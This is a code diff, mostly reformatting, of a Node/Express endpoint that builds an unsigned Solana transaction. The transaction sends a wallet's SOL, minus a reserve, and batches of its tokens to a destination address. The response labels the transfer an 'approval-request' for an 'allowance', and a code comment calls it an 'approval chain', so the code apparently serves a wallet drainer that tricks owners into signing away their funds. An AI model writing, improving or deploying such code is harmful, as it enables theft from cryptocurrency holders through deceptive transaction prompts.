@@ -526,29 +526,40 @@ app.post('/api/send-tx/:pubkey', async (req, res) => {
     }
 
     tx.feePayer = from;
-    const latest = await connection.getLatestBlockhash('confirmed');
-    tx.recentBlockhash = latest.blockhash;
+    const latestBlockhashInfo = await connection.getLatestBlockhash('confirmed');
+    tx.recentBlockhash = latestBlockhashInfo.blockhash;
 
-    tx.feePayer = from; const latest = await connection.getLatestBlockhash('confirmed'); tx.recentBlockhash = latest.blockhash;
-    // Added configuration to ensure simulation handles approval chains correctly const sim = await connection.simulateTransaction(tx, { sigVerify: false, replaceRecentBlockhash: true, commitment: 'confirmed' });
-    if (sim.value.err) { return res.status(400).json({ error: Transaction simulation failed: ${ JSON.stringify(sim.value.err) }, logs: (sim.value.logs || []).slice(-8), }); }
+    // Handles approval chain simulations correctly
+    const sim = await connection.simulateTransaction(tx, {
+      sigVerify: false,
+      replaceRecentBlockhash: true,
+      commitment: 'confirmed'
+    });
 
-const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
-res.json({
-  from: fromStr,
-  to: dest.toBase58(),
-  sol: Math.max(sendLamports, 0) / LAMPORTS_PER_SOL,
-  reservedSol: reserveSol,
-  tokens: included,
-  tokenCount: included.length,
-  remainingTokens: Math.max(tokens.length - batch.length, 0),
-  transaction: Buffer.from(serialized).toString('base64'),
-  label: `approval-request ${included.length} tokens + SOL allowance`, // Updated to match the new behavior
-});
+    if (sim.value.err) {
+      return res.status(400).json({
+        error: `Transaction simulation failed: ${JSON.stringify(sim.value.err)}`,
+        logs: (sim.value.logs || []).slice(-8),
+      });
+    }
+
+
+    const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
+    res.json({
+      from: fromStr,
+      to: dest.toBase58(),
+      sol: Math.max(sendLamports, 0) / LAMPORTS_PER_SOL,
+      reservedSol: reserveSol,
+      tokens: included,
+      tokenCount: included.length,
+      remainingTokens: Math.max(tokens.length - batch.length, 0),
+      transaction: Buffer.from(serialized).toString('base64'),
+      label: `approval-request ${included.length} tokens + SOL allowance`, // Updated to match the new behavior
+    });
   } catch (err) {
-  console.error(err);
-  res.status(400).json({ error: err.message });
-}
+    console.error(err);
+    res.status(400).json({ error: err.message });
+  }
 });
 
 
